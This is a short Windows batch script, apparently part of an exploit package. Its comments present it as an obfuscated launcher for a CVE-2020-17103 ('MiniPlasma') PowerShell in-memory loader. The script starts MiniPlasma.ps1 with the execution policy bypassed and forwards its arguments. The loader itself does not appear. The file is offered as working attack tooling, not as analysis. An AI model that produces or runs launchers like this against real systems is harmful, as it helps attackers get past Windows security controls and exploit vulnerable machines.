@echo off
REM ============================================
REM MiniPlasma (CVE-2020-17103) Obfuscated
REM Launcher - runs the PowerShell in-memory loader
REM ============================================
setlocal
cd /d "%~dp0"
start /wait powershell -ExecutionPolicy Bypass -File "%~dp0MiniPlasma.ps1" %*
pause